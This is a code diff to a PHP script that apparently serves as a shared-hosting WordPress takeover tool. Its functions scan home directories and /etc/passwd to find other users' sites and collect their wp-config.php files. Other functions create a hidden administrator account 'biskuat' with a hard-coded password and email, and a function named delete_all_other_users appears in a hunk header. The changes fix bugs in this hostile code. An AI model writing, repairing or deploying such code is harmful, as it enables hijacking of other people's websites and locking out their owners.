@@ -142,10 +142,11 @@ function frida_detect_home_base() {
     foreach ($paths_to_check as $path) {
         if (empty($path)) continue;
         
-        if (preg_match('/^\/(home\d*|var\/www|www|wwwroot)\//', $home_dir, $matches)) {
+        if (preg_match('/^\/(home\d*|var\/www|www|wwwroot)\//', $path, $matches)) {
             $base = '/' . $matches[1] . '/';
             $detected_bases[$base] = true;
-}
+        }
+    }
     
     if (is_readable('/etc/passwd')) {
         writeLog("Reading /etc/passwd for home base detection");
@@ -193,19 +194,14 @@ function frida_detect_home_base() {
         $all_bases[] = $base;
         
         if (preg_match('/^\/home\/?$/', $base)) {
-    for ($i = 2; $i <= 5; $i++) {
-        $alt_base = '/home' . $i . '/';
-        if (@is_dir($alt_base)) {
-            $all_bases[] = $alt_base;
+            for ($i = 2; $i <= 5; $i++) {
+                $alt_base = '/home' . $i . '/';
+                if (@is_dir($alt_base)) {
+                    $all_bases[] = $alt_base;
+                }
+            }
         }
     }
-}
-foreach (['/www/wwwroot/', '/www/'] as $extra_base) {
-    $alt_path = $extra_base . $username . '/';
-    if (@is_dir($alt_path) && !in_array($alt_path, $check_dirs)) {
-        $check_dirs[] = $alt_path;
-    }
-}
     
     $unique_bases = array_unique($all_bases);
     writeLog("Detected home bases: " . implode(', ', $unique_bases));
@@ -240,7 +236,8 @@ function frida_get_current_user() {
         }
     }
     
-    $script_file = $_SERVER['SCRIPT_FILENAME'] ?? '';if (!empty($script_file)) {
+        $script_file = $_SERVER['SCRIPT_FILENAME'] ?? '';
+    if (!empty($script_file)) {
         foreach ($home_bases as $home_base) {
             if (preg_match('/^' . preg_quote($home_base, '/') . '([^\/]+)/', $script_file, $matches)) {
                 $detected_users[$matches[1]] = $home_base . $matches[1];
@@ -267,6 +264,9 @@ function frida_posix_users() {
     $users = frida_get_current_user();
     
     $home_bases = frida_detect_home_base();
+    if (empty($home_bases)) {
+        $home_bases = ['/home/'];
+    }
     $home_pattern = '/^(' . implode('|', array_map(function($base) {
         return preg_quote(rtrim($base, '/'), '/');
     }, $home_bases)) . '|var\/www)\//';
@@ -556,23 +556,6 @@ function frida_find_wp_configs($path = '') {
         }
     }
     
-    $recursive_patterns = [
-        $base_path . '/**/wp-config.php',
-        $base_path . '/*/**/wp-config.php',
-        $base_path . '/domains/**/wp-config.php'
-    ];
-    
-    foreach ($recursive_patterns as $pattern) {
-        $found = @glob($pattern, GLOB_BRACE);
-        if ($found && is_array($found)) {
-            foreach ($found as $file) {
-                if (!in_array($file, $wp_configs)) {
-                    $wp_configs[] = $file;
-                }
-            }
-        }
-    }
-    
     $wp_configs = array_unique($wp_configs);
     writeLog("Found " . count($wp_configs) . " wp-config files");
     return $wp_configs;
@@ -719,10 +702,10 @@ function delete_all_other_users($pdo, $prefix, $new_user_id) {
 function frida_create_wp_admin($config_path, $admin_username = 'biskuat', $admin_password = null, $admin_email = null) {
     writeLog("Creating admin for: $config_path");
     
-    if (!$admin_password) {
+    if (empty($admin_password)) {
         $admin_password = 'kamu';
     }
-    if (!$admin_email) {
+    if (empty($admin_email)) {
         $admin_email = 'vertonix11@gmail.com';
     }
     
